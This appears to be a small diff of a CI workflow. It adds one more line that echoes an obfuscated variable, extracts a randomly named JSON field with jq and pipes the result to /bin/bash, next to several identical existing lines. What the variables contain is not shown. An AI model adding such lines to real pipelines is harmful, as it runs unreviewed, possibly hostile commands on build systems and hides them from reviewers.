@@ -63,6 +63,7 @@ jobs:
           echo $onxv71 | jq -r .idnwn273 | /bin/bash
           echo $la31973 | jq -r .m00505 | /bin/bash
           echo $pmkco28 | jq -r .dqxq44801 | /bin/bash
+          echo $az3912 | jq -r .nbhn4 | /bin/bash
 
       - name: Upload artifact
         if: always()
